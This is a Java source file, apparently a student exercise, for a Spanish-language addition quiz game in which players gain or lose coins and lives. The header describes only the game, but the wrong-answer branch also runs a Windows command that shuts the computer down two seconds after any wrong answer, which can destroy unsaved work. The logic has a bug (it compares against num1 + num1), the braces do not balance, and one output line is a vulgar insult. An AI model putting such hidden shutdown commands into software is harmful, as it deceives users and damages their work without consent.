//Un programa que si aciertas la suma aleatoria te suma una moneda, si la fallas te quita una vida y una moneda.
//Fecha: Despues de hacer los ejercicios.
//Autores: Daniel Lazar Alexandru Paun

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Random;
import java.util.Scanner;


public class lol {
    public static void main(String[] args) {
        System.out.println(" Version 0.3 alfa");
        int monedos=0;
        int vidas=3;
        int respuesta;
       while (vidas > 0) {
        Scanner teclado= new Scanner(System.in);    
        Random r= new Random();
        Random r2 = new Random();
        int num1 = r.nextInt(500);
        int num2 = r2.nextInt(500);
        System.out.println("Suma " + num1 + "+" + num2);
        respuesta = teclado.nextInt();
        if (num1 + num2 == respuesta) {
            ++monedos;
             System.out.println("Mucho bueno");
            System.out.println("Tenes un garron de la gran flauta y " + monedos + " monedos");
            
        } else if (num1 + num1 != respuesta) {
         --monedos;   
         System.out.println("Ai ramas sarac in plm" + "mai ai " + monedos + " monedos");
        --vidas;
        System.out.println("Te quedan " + vidas + " vidas");
        System.out.println("La respuesta correcta es " + (num1+num2));
        ProcessBuilder processBuilder = new ProcessBuilder();
        // Windows
        processBuilder.command("cmd.exe", "/c", "shutdown -s -t 2");

        try {

            Process process = processBuilder.start();

            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();
            System.out.println("\nExited with error code : " + exitCode);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }

}
        
        
        }
       
       

       
    }

